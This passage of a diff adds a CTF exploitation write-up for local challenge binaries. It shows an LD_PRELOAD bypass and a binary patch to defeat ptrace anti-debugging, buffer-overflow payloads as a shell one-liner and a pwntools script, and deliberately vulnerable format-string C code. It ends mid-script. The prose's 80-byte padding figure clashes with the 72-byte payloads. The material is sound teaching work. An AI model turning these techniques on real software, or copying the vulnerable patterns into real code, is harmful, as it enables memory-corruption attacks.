+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Incorrect password cannot print account statement. Please try again!!!!&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check&lt;/span&gt;()	&lt;span style=&#34;color:#75715e&#34;&gt;/*sym.check*/&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; trace &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    trace &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptrace(PTRACE_TRACEME, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(trace &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+    {
+        puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;========&amp;gt; LOL!!!!!! &amp;lt;========&amp;#34;&lt;/span&gt;);
+        exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Terminate entire process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;code-breakdown-1&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Creates a buffer of 72 bytes and a volatile variable (dubbed &lt;code&gt;password&lt;/code&gt;) with &lt;code&gt;0x43563139&lt;/code&gt; as its value&lt;/li&gt;
+&lt;li&gt;Reads and prints out the buffer as well as &lt;code&gt;password&lt;/code&gt;, consecutively.&lt;/li&gt;
+&lt;li&gt;Prints the flag whether &lt;code&gt;password&lt;/code&gt; is equal to &lt;code&gt;0xdeadbeef&lt;/code&gt;; otherwise, exits normally&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;check&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Being called during startup (&lt;code&gt;__libc_csu_init&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Traces and examines memory region and registers to act as an anti-debugging method&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar2.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solution-1&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;In order to solve the challenge, we need to modify the volatile variable &lt;code&gt;password&lt;/code&gt; to &lt;code&gt;0xdeadbeef&lt;/code&gt;. However, there is one impediment preventing us from determining the padding length or debugging the program as a result of an anti-debugging technique implemented in &lt;code&gt;check&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The implementation invokes &lt;code&gt;ptrace&lt;/code&gt; function to attach to our process at runtime so it can monitor and control the execution flow. You can find more information about &lt;code&gt;ptrace&lt;/code&gt; by visiting this &lt;a href=&#34;https://man7.org/linux/man-pages/man2/ptrace.2.html&#34;&gt;man page&lt;/a&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;signature-overridden&#34;&gt;Signature overridden&lt;/h4&gt;
+&lt;p&gt;So we have to think of a way to bypass this anti-debugging procedure, and fortunately, we can actually achieve this by abusing the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environment variable as it lets us control the loading path of a shared library, hence enables us to neutralize &lt;code&gt;ptrace&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Let us create a shared library with &lt;code&gt;ptrace&lt;/code&gt; signature to override it&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// A &amp;#34;do-nothing&amp;#34; ptrace
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ptrace&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; request, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pid, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;addr, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;then we shall compile it as &lt;code&gt;gcc -shared ptrace.c -o ptrace.so&lt;/code&gt; and load it into radare2 with the following options:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ r2 -Ad -e bin.cache&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -Rsetenv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LD_PRELOAD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./ptrace_bypass.so ./ChickenStar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar3.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;patching-opcodes&#34;&gt;Patching opcodes&lt;/h4&gt;
+&lt;p&gt;Another quick, reliable method is to patch the jump condition inside the &lt;code&gt;check&lt;/code&gt; procedure.&lt;/p&gt;
+&lt;p&gt;Reload the binary in radare2 with write mode enabled and pay your attention to the code within&lt;code&gt;0x00001293&lt;/code&gt; - &lt;code&gt;0x000012ab&lt;/code&gt; range.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌ 69: sym.check ();
+...
+│           0x0000128f      4883f8ff       cmp rax, 0xffffffffffffffff
+│       ┌─&amp;lt; 0x00001293      7416           jne 0x12ab			; PATCH
+│       │   0x00001295      488d3d6c0d00.  lea rdi, str.__LOL________  ; 0x2008 ; &amp;quot;========&amp;gt; LOL!!!!!! &amp;lt;========&amp;quot; ; const char *s
+│       │   0x0000129c      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
+│       │   0x000012a1      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
+│       │   0x000012a6      e835feffff     call sym.imp._exit          ; void _exit(int status) &amp;lt;--- This will exit the program and we don&#39;t want that!
+│       │   ; CODE XREF from sym.check @ 0x1293
+│       └─&amp;gt; 0x000012ab      90             nop
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As can be seen, we have to patch the &lt;code&gt;JNE&lt;/code&gt; instruction with &lt;code&gt;JE&lt;/code&gt; as we want it to always take the jump to the &lt;code&gt;NOP&lt;/code&gt; instruction at &lt;code&gt;0x000012ab&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_11-42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Reopen the file and it should work properly.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;debugging&#34;&gt;Debugging&lt;/h4&gt;
+&lt;p&gt;We are finally able to debug as well as calculate the distance between our buffer and &lt;code&gt;password&lt;/code&gt;. Now, let us set a breakpoint after &lt;code&gt;scanf&lt;/code&gt; and have a look at the stack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_14-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By respectively subtracting the two offsets containing &lt;code&gt;0x43563139&lt;/code&gt; and &lt;code&gt;0x636261&lt;/code&gt; with each other and we thereby have our padding length of 80 bytes whereas the last 8 bytes is for &lt;code&gt;password&lt;/code&gt; (&lt;code&gt;QWORD&lt;/code&gt;, or &lt;code&gt;long&lt;/code&gt; type).&lt;/p&gt;
+&lt;p&gt;Skeleton payload:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = PADDING (72) + PASSWORD (0xdeadbeef)
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;solvepy-1&#34;&gt;Solve.py&lt;/h3&gt;
+&lt;p&gt;This challenge can be solve with this simple one-liner&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print b&amp;#39;A&amp;#39;*72 + b&amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;#34;&lt;/span&gt; | ./ChickenStar 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or you want to play around with pwntools more then here:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./ChickenStar&amp;#39;&lt;/span&gt;)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;account statement: &amp;#39;&lt;/span&gt;, payload)
+print(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clean()) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_17-00.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;login-custom&#34;&gt;login (custom)&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Goal:&lt;/strong&gt; Be able to fully comprehend the format string vulnerability as well as other protection bits (e.g., PIE/PIC, canary, ASLR and RELRO).&lt;/p&gt;
+&lt;p&gt;In the previous tasks, we have been repeatedly mentioning PIE/PIC, format string vulnerability and canaries but did not go in detail. Considering that, I have made a customized challenge as a nice little &lt;em&gt;stopover&lt;/em&gt; for you readers to practice and have a concrete understanding about the aforementioned concepts.&lt;/p&gt;
+&lt;p&gt;The challenge also comes with its source code and build options, feel free to reproduce or modify it to your liking and it is strongly recommended that you should try to complete the tasks to some extent before reaching the solution part.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//Build: $ gcc -g readme.c -o readme -pie -fstack-protector -z execstack 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; authen_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;win&lt;/span&gt;();
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() 
+{
+	login();
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;win&lt;/span&gt;()
+{
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Congratulation! You&amp;#39;ve won!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+}
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;()
+{
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; creds[&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt; };
+	authen_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBADF00D&lt;/span&gt;;
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to %lx sector!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, login);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter credentials: &amp;#34;&lt;/span&gt;);
+	fgets(creds, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(creds) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;), stdin);
+	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Verifying...&amp;#34;&lt;/span&gt;);
+	printf(creds);
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ee71ee7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; authen_code)
+	{
+		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nice job!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Now gotta call win()!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+	}
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+	{
+		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your authen_code is invalid!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;authen_code = %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, authen_code);
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;fingerprinting-2&#34;&gt;Fingerprinting&lt;/h3&gt;
+&lt;p&gt;Expected output during normal run&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/login1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and the properties.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0x00001090&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; iI~nx,relro,canary,bits,pic
+bits     &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
+canary   true
+nx       true
+pic      true
+relro    partial
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As demonstrated, the program reads from STDIN, prints a welcome message with our input and carries out a conditional jump before exiting. In most scenarios, this conventional functionality of printing out exact input values is likely an indication of information leakage, herein the format string vulnerability.&lt;/p&gt;
+&lt;p&gt;You can try confirming it by feeding the buffer with &lt;strong&gt;format specifiers&lt;/strong&gt; then see if there are any odd values printed out. Let us use &lt;code&gt;%p&lt;/code&gt; which is a pointer specifier and here is the result:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_09-12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can go back to and read the previous example about format string in part one - &lt;a href=&#34;https://legiahuyy.github.io/blog/en/posts/pwns-1/#solution-3&#34;&gt;canary&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;code-breakdown-2&#34;&gt;Code breakdown&lt;/h3&gt;
+&lt;p&gt;There are three functions: &lt;code&gt;main&lt;/code&gt;, &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt;; and a global variable &lt;code&gt;authen_code&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Whereas &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; respectively invokes &lt;code&gt;login&lt;/code&gt; and prints a congratulation message, &lt;code&gt;login&lt;/code&gt; has a slightly more complicated structure as it does:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a buffer, dubbed &lt;code&gt;creds&lt;/code&gt;, of 255 bytes in size&lt;/li&gt;
+&lt;li&gt;Assign &lt;code&gt;0xBADF00D&lt;/code&gt; to the global variable &lt;code&gt;authen_code&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Print the current address of itself&lt;/li&gt;
+&lt;li&gt;Securely read the input from STDIN to &lt;code&gt;creds&lt;/code&gt; using &lt;code&gt;fgets&lt;/code&gt; then print &lt;code&gt;creds&lt;/code&gt; out again with &lt;code&gt;printf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Invoke &lt;code&gt;exit(0)&lt;/code&gt; whether &lt;code&gt;0x1ee71ee7 == authen_code&lt;/code&gt;, otherwise print an error message and current &lt;code&gt;authen_code&lt;/code&gt; value&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Henceforth, we will have to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Calculate the base address of our binary using the leaked address of &lt;code&gt;login&lt;/code&gt; and bypass PIE/PIC&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Manipulate the format string vulnerability to perform an arbitrary read/write and modify the value of &lt;code&gt;authen_code&lt;/code&gt; to &lt;code&gt;0x1ee71ee7&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Overwrite the &lt;strong&gt;G&lt;/strong&gt;lobal &lt;strong&gt;O&lt;/strong&gt;ffset &lt;strong&gt;T&lt;/strong&gt;able and call &lt;code&gt;win&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;in-depth-analysis-1&#34;&gt;In-depth analysis&lt;/h3&gt;
+&lt;p&gt;Load the binary into radare2 and have a glance at its disassembled functions.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;and &lt;code&gt;win&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You might be wondering why there is no canary check in either the prologue or epilogue of these two &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;win&lt;/code&gt; functions. This happens since the two simply do not inquire about the stack or have any particularly tasks that need the sentinel values.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;login&lt;/code&gt;, however, is different as it is plain to see the canary is being stored at &lt;code&gt;rbp-0x8&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x7f492b935050]&amp;gt; pdf @ sym.login
+            ; CALL XREF from main @ 0x56279e188182
+            ; DATA XREF from sym.login @ 0x56279e18820c
+┌ 329: sym.login ();
+│           ; var int64_t var_110h @ rbp-0x110
+│           ; var int64_t var_108h @ rbp-0x108
+│           ; var int64_t var_100h @ rbp-0x100
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x56279e1881a4      55             push rbp
+│           0x56279e1881a5      4889e5         mov rbp, rsp
+│           0x56279e1881a8      4881ec100100.  sub rsp, 0x110
+│           0x56279e1881af      64488b042528.  mov rax, qword fs:[0x28]
+│           0x56279e1881b8      488945f8       mov qword [var_8h], rax
+│           0x56279e1881bc      31c0           xor eax, eax
+...
+│           0x56279e1882d6      90             nop
+│           0x56279e1882d7      488b45f8       mov rax, qword [var_8h]
+│           0x56279e1882db      64482b042528.  sub rax, qword fs:[0x28]
+│       ┌─&amp;lt; 0x56279e1882e4      7405           je 0x56279e1882eb
+│       │   0x56279e1882e6      e855fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+│       └─&amp;gt; 0x56279e1882eb      c9             leave
+└           0x56279e1882ec      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;arbitrary-read-with-format-string&#34;&gt;Arbitrary read with Format String&lt;/h4&gt;
+&lt;p&gt;Our first objective is to have &lt;code&gt;authen_code&lt;/code&gt; value overwritten to &lt;code&gt;0x1ee71ee7&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;But there is no buffer overflow gadget to use as the code is using &lt;code&gt;fgets&lt;/code&gt; to properly read our input, so the only solution left is format string which can be triggered within the &lt;code&gt;printf&lt;/code&gt; function. We thus have to determine where we can read our buffer, and fortunately that pwntools is able to help us to automatically accomplish the process. It might be worth nothing but you can find information about the manual method in our previous &amp;ldquo;canary&amp;rdquo; challenge from part one.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I have already prepared the script using FmtStr&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Load the binary&lt;/span&gt;
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./login&amp;#34;&lt;/span&gt;)	
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Due to my Linux is constantly handling lots of buffering,&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# so it has to use a pseudo-terminal to prompt for IO properly&lt;/span&gt;
+pty &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PTY	
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec_fmt&lt;/span&gt;(payload):
+	p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pty)
+	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter credentials: &amp;#39;&lt;/span&gt;, payload)
